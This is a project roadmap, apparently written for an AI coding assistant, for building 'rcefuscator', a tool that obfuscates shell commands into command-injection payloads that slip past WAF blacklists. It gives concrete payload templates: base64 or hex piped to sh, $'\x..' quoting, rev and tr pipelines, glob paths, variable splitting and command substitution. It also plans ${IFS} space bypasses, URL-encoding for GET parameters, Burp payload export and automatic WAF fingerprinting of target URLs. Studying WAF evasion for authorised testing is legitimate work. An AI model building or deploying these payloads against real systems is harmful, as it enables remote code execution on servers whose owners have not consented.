# rcefuscator — Complete End-to-End Project Execution Roadmap

> **Project**: rcefuscator — RCE Payload Generator & WAF Evasion Toolkit
> **Author**: ak4hit | **Repo**: github.com/ak4hit/rcefuscator
> **Domain**: Offensive Security / Red Teaming / CTF
> **Purpose**: Educational tool demonstrating WAF bypass techniques for command injection contexts

---

## 🚀 PORTABILITY PROTOCOL: How to resume this on any machine

1. **Clone the repo** on your machine.
2. **Transfer this `implementation_plan.md`** into the project root.
3. **Open your AI coding assistant** in that folder.
4. **Send this exact first prompt**:
   > *"I am starting development. Please read `implementation_plan.md` in this directory. It is the absolute source of truth. Once read, ask me for any Pre-Build Inputs and begin Phase 1."*

The AI will ingest this document, understand the 4-phase architecture, module structure, and CLI design, and scaffold Phase 1 immediately.

---

## ⚠️ DISCLAIMER (Must Be Included in Final README)

> This tool is strictly for **authorized penetration testing, CTF challenges, and educational research**. Using this tool against systems you do not own or have explicit written permission to test is **illegal**. The author bears no responsibility for misuse.

---

## What This Roadmap Covers

rcefuscator takes a user-supplied OS command (e.g. `id`, `whoami`, `cat /etc/passwd`) and outputs multiple obfuscated payload variants designed to bypass naïve WAF filters that block common injection characters (`;`, `|`, `&`, `$`, backticks, `(`, `)`). It targets the `shell_exec($_GET['cmd'])` PHP sink context but applies broadly to any command injection scenario.

**Ownership Key:**
- 🤖 **Antigravity** — Handle this automatically
- 👤 **You** — You must provide this input
- ⚙️ **Shared** — Build the code; you supply the value

---

## 🔴 CRITICAL: Pre-Build Inputs Required From You

> [!IMPORTANT]
> Supply the following before or during the relevant phase. Missing items will block progress.

| # | Item | Phase Needed | Format |
|---|------|-------------|--------|
| C-01 | **Target shell context** (bash/sh/zsh) | Phase 2 | Default: `bash` — confirm if different |
| C-02 | **Blacklist character set** to evade | Phase 2 | Default: `; \| & $ \` ( ) < >` |
| C-03 | **Output format preference** (plain/JSON/colored) | Phase 3 | Default: colored terminal + optional `--json` flag |
| C-04 | **Test environment** for validation | Phase 4 | A local Linux VM or Docker container with bash |
| C-05 | **GitHub repo name & visibility** | Phase 4 | e.g. `rcefuscator` / public |

---

## Phase Overview

```
Phase 1 → Project Scaffolding & Structure         (~1 hr)
Phase 2 → Core Obfuscation Engine                 (~3–4 hrs)
Phase 3 → CLI Interface & Output Formatter        (~2 hrs)
Phase 4 → Testing, Validation & GitHub Release    (~2–3 hrs)
```

**Total estimated build time**: 8–10 focused hours

---

## Phase 1 — Project Scaffolding & Structure

> Goal: Clean, installable Python package structure. Zero code yet — just layout and boilerplate.

### 1.1 — Initialize Directory Structure 🤖

```
rcefuscator/
├── rcefuscator/
│   ├── __init__.py
│   ├── core/
│   │   ├── __init__.py
│   │   ├── encoder.py          # All encoding/obfuscation functions
│   │   ├── techniques.py       # Technique registry & metadata
│   │   └── validator.py        # Blacklist checker & payload verifier
│   ├── cli/
│   │   ├── __init__.py
│   │   └── main.py             # Click-based CLI entrypoint
│   └── output/
│       ├── __init__.py
│       ├── formatter.py        # Colored terminal output
│       └── exporter.py         # JSON / file export
├── tests/
│   ├── test_encoder.py
│   ├── test_validator.py
│   └── test_cli.py
├── examples/
│   └── sample_outputs.txt      # Pre-generated example outputs for README
├── requirements.txt
├── setup.py
├── .gitignore
├── LICENSE                     # MIT
├── DISCLAIMER.md
└── README.md
```

### 1.2 — Create `requirements.txt` 🤖

```
click==8.1.7
rich==13.7.0
pyperclip==1.8.2
pytest==8.3.0
```

> [!NOTE]
> `pyperclip` requires a system clipboard backend on Linux. Antigravity must:
> 1. Wrap all clipboard calls in try/except — never crash if unavailable
> 2. On failure, print: `[!] Clipboard unavailable. Install xclip: sudo apt install xclip`
> 3. Add to README install section:
> ```bash
> sudo apt install xclip    # Debian/Ubuntu/Kali
> sudo pacman -S xclip      # Arch
> sudo dnf install xclip    # Fedora
> ```

### 1.3 — Create `setup.py` for pip install 🤖

```python
from setuptools import setup, find_packages

setup(
    name="rcefuscator",
    version="1.0.0",
    packages=find_packages(),
    install_requires=["click", "rich", "pyperclip"],
    entry_points={
        "console_scripts": [
            "rcefuscator=rcefuscator.cli.main:cli",
        ],
    },
)
```

### 1.4 — Create `.gitignore` 🤖

Standard Python `.gitignore`: `__pycache__`, `.venv`, `*.pyc`, `.env`, `dist/`, `*.egg-info/`

### 1.5 — Create `DISCLAIMER.md` 🤖

Full legal disclaimer. Educational use only. Must be acknowledged at first CLI run (one-time prompt: `[y/N] I confirm this tool will only be used on systems I own or have written permission to test`).

---

## Phase 2 — Core Obfuscation Engine

> Goal: All 9 obfuscation techniques implemented, tested, and registered in the technique registry.

### 2.1 — Blacklist Validator (`validator.py`) 🤖

Function: `check_payload(payload: str, blacklist: list[str]) -> bool`
- Returns `True` if payload is clean (no blacklisted chars)
- Returns `False` + highlights which chars are present
- Used to auto-filter generated payloads before showing output

### 2.2 — Technique: Base64 Encoding 🤖

```python
# Input: id
# Output: echo 'aWQ=' | base64 -d | sh
def base64_encode(cmd: str) -> str
```

- Encode command → base64
- Wrap: `echo '{b64}' | base64 -d | sh`
- Uses `|` — flag if `|` is in blacklist, skip this technique

### 2.3 — Technique: Hex Encoding 🤖

```python
# Input: id
# Output: printf '%s' '\x69\x64' | xxd -p -r | sh
def hex_encode(cmd: str) -> str
```

Two variants:
- `printf` + `xxd` pipe
- `$'\x69\x64'` bash ANSI-C quoting (no pipe needed)

### 2.4 — Technique: Variable Splitting 🤖

```python
# Input: id
# Output: _a=i;_b=d;$_a$_b
def var_split(cmd: str) -> str
```

- Split command string into 2-char chunks
- Assign each to unique variable names
- Concatenate via `$var1$var2...`
- Avoids spaces where possible

### 2.5 — Technique: Wildcard / Glob Expansion 🤖

```python
# Input: id
# Output: /???/id  or  /usr/bin/id via /???/b??/id
def wildcard_expand(cmd: str) -> str
```

- Build known binary paths: `/bin/`, `/usr/bin/`, `/usr/local/bin/`
- Replace directory components with `???` patterns
- Only works for absolute-path commands — Antigravity must hardcode the following lookup table in `encoder.py`:

```python
BINARY_PATHS = {
    "id":      "/usr/bin/id",
    "whoami":  "/usr/bin/whoami",
    "cat":     "/bin/cat",
    "ls":      "/bin/ls",
    "curl":    "/usr/bin/curl",
    "wget":    "/usr/bin/wget",
    "python3": "/usr/bin/python3",
    "bash":    "/bin/bash",
    "sh":      "/bin/sh",
    "nc":      "/bin/nc",
    "ncat":    "/usr/bin/ncat",
    "find":    "/usr/bin/find",
    "uname":   "/bin/uname",
    "hostname":"/bin/hostname",
    "env":     "/usr/bin/env",
}
```

- If command's binary is not in `BINARY_PATHS`, skip this technique and warn: `[!] Wildcard technique skipped: unknown binary path for '{cmd}'`

### 2.6 — Technique: Reverse String 🤖

```python
# Input: id
# Output: echo 'di' | rev | sh
def reverse_encode(cmd: str) -> str
```

- Reverse the command string
- Wrap: `echo '{reversed}' | rev | sh`
- Flag if `|` is blacklisted

### 2.7 — Technique: Case Manipulation 🤖

```python
# Input: id
# Output: echo 'ID' | tr 'A-Z' 'a-z' | sh
def case_mangle(cmd: str) -> str
```

- Uppercase the command
- Wrap with `tr` lowercasing pipeline

### 2.8 — Technique: `$'\x..'` ANSI-C Quoting 🤖

```python
# Input: id
# Output: $'\x69\x64'
def ansi_c_quote(cmd: str) -> str
```

- Convert each character to `\xHH`
- Wrap in `$'...'` — bash executes directly
- **No pipes, no special chars needed** — cleanest technique

### 2.9 — Technique: Command Substitution Wrapper 🤖

```python
# Input: id
# Output: $(printf '\x69\x64')  or  `printf '\x69\x64'`
def cmd_substitution(cmd: str) -> str
```

- Combine with hex encoding inside `$(...)` or backticks
- Offer both variants; flag which chars each uses

### 2.10 — Technique Registry (`techniques.py`) 🤖

```python
TECHNIQUES = [
    {
        "id": "base64",
        "name": "Base64 Encoding",
        "function": base64_encode,
        "uses_chars": ["|"],
        "shell": "bash/sh",
        "description": "Encodes command as base64, decoded at runtime"
    },
    # ... all 9 techniques
]
```

- Each entry declares which special chars the technique **itself uses**
- Auto-skip technique if any of its `uses_chars` are in the blacklist
- This allows intelligent filtering per target WAF profile

### 2.11 — WAF Profile Presets 🤖

```python
WAF_PROFILES = {
    "strict":   [";", "|", "&", "$", "`", "(", ")", "<", ">", " "],
    "moderate": [";", "|", "&", "`"],
    "paranoid": [";", "|", "&", "$", "`", "(", ")", "<", ">", " ", "'", '"', "\\"],
    "custom":   []  # populated from --blacklist flag
}
```

---

## Phase 3 — CLI Interface & Output Formatter

> Goal: Clean, professional CLI. Single command generates all viable payloads, color-coded, with copy-to-clipboard support.

### 3.1 — CLI Entry Point (`cli/main.py`) 🤖

```bash
# Basic usage
rcefuscator --cmd "id"

# With WAF profile
rcefuscator --cmd "id" --profile strict

# Custom blacklist
rcefuscator --cmd "whoami" --blacklist "; | & $ \`"

# JSON output
rcefuscator --cmd "id" --json

# Save to file
rcefuscator --cmd "id" --output payloads.txt

# Single technique
rcefuscator --cmd "id" --technique base64

# List all techniques
rcefuscator --list-techniques

# Copy first result to clipboard
rcefuscator --cmd "id" --copy
```

### 3.2 — Rich Terminal Output (`output/formatter.py`) 🤖

Output format per payload:

```
┌─────────────────────────────────────────────────┐
│  [1] Base64 Encoding                            │
│  ✅ Clean (no blacklisted chars)                │
├─────────────────────────────────────────────────┤
│  echo 'aWQ=' | base64 -d | sh                  │
│                                                 │
│  Uses chars: |                                  │
│  Shell: bash/sh                                 │
└─────────────────────────────────────────────────┘
```

- Green border = payload passes blacklist check
- Red border = payload uses blacklisted chars (shown but marked as unsafe)
- Summary line at end: `Generated 9 payloads. 6 clean for your WAF profile.`

### 3.3 — JSON Exporter (`output/exporter.py`) 🤖

```json
{
  "command": "id",
  "waf_profile": "moderate",
  "generated_at": "2026-05-06T...",
  "payloads": [
    {
      "technique": "base64",
      "payload": "echo 'aWQ=' | base64 -d | sh",
      "clean": true,
      "uses_chars": ["|"],
      "shell": "bash/sh"
    }
  ]
}
```

### 3.4 — One-Time Disclaimer Prompt 🤖

On first-ever run, display the disclaimer and require `y` to continue. Store acknowledgment in `~/.rcefuscator_ack`. Never prompt again after that.

---

## Phase 4 — Testing, Validation & GitHub Release

> Goal: All techniques verified to produce working payloads. Clean GitHub repo with proper docs.

### 4.1 — Unit Tests (`tests/`) 🤖

For each technique:
- `test_output_not_empty()`
- `test_no_blacklisted_chars_in_clean_payload()`
- `test_payload_structure_valid()` (correct wrapping syntax)
- `test_validator_detects_dirty_payload()`
- `test_registry_has_all_9_techniques()`

### 4.2 — Functional Validation in Docker 👤 / 🤖

> [!IMPORTANT]
> You must run this validation step manually in a safe Linux environment.

```bash
docker run --rm -it ubuntu:22.04 bash
# Then test each generated payload manually to confirm it executes `id`
```

Antigravity will generate a `tests/functional_test.sh` script that loops through all payloads and confirms output contains `uid=`.

### 4.3 — README.md 🤖

Sections:
1. **What it is** (2 sentences)
2. **Disclaimer** (link to DISCLAIMER.md)
3. **Install** (`pip install .` or `pip install -e .`)
4. **Usage** (all CLI flags with examples)
5. **Techniques Table** (all 9, with example output for `id`)
6. **WAF Profiles** (strict / moderate / paranoid / custom)
7. **How it works** (brief explanation of each technique)
8. **Contributing**
9. **License** (MIT)

### 4.4 — GitHub Repo Setup 👤

```bash
git init
git add .
git commit -m "feat: initial release v1.0.0"
git remote add origin https://github.com/ak4hit/rcefuscator.git
git push -u origin main
```

Add topics in GitHub UI: `penetration-testing`, `ctf`, `waf-bypass`, `command-injection`, `python`, `security`, `red-team`

### 4.5 — GitHub Release v1.0.0 👤

- Tag: `v1.0.0`
- Attach: auto-generated `sample_outputs.txt` showing all techniques for `id` and `whoami`

---

## Open Questions — Decide Before Relevant Phase

| ID | Question | Recommended Default | Your Decision |
|----|----------|--------------------| --------------|
| OQ-01 | Support multi-word commands like `cat /etc/passwd`? | Yes — handle spaces via `${IFS}` substitution | ❓ |
| OQ-02 | Add URL-encoding of final payload as extra option? | Yes — `--url-encode` flag for direct use in GET params | ❓ |
| OQ-03 | Windows CMD support (for SSJI context)? | Out of scope v1.0 — Linux/bash only | ❓ |
| OQ-04 | Interactive mode (REPL loop)? | Yes — `rcefuscator --interactive` | ❓ |
| OQ-05 | Pipe-safe alternative for `base64` technique when `\|` is blacklisted? | Use `$'\x..'` ANSI-C quote technique instead | ❓ |

---

## Missing Components & Potential Blockers

> [!WARNING]

| Component | Status | Notes |
|-----------|--------|-------|
| **Space in commands** | ⚠️ Not yet handled | `cat /etc/passwd` has a space — need `${IFS}` substitution or `$'\x20'` |
| **`pyperclip` on Linux** | ⚠️ May need `xclip`/`xsel` | Document in README: `sudo apt install xclip` |
| **Wildcard lookup table** | ❗ Manual curation needed | Must hardcode common binary paths for glob technique |
| **Windows CMD payloads** | ✅ Out of scope v1.0 | Noted for v2.0 |

---

## Suggested Improvements (Beyond v1.0)

> [!TIP]

1. **`--url-encode` flag**: Auto URL-encode the final payload for direct paste into browser address bar.
2. **Space handler**: Auto-replace spaces with `${IFS}` in all techniques — makes multi-word commands like `cat /etc/passwd` work seamlessly.
3. **Burp Suite extension**: Export as a Burp intruder payload list (one payload per line).
4. **`--verify` flag**: Spin up a local bash subprocess, run each payload, confirm output matches expected command result — automated functional test.
5. **WAF fingerprint mode**: Given a target URL, probe with test payloads and auto-detect which chars are blocked, then select optimal techniques automatically.

---

## Execution Sequence Summary

```
Phase 1   ∙ [ ]     Scaffolding, package structure, requirements
Phase 2   ∙ [ ]     All 9 obfuscation techniques + registry + WAF profiles
Phase 3   ∙ [ ]     CLI (Click), Rich output, JSON export, disclaimer prompt
Phase 4   ∙ [ ]     Tests, Docker validation, README, GitHub release
```

---

*rcefuscator Execution Roadmap · ak4hit · Educational Use Only · v1.0*
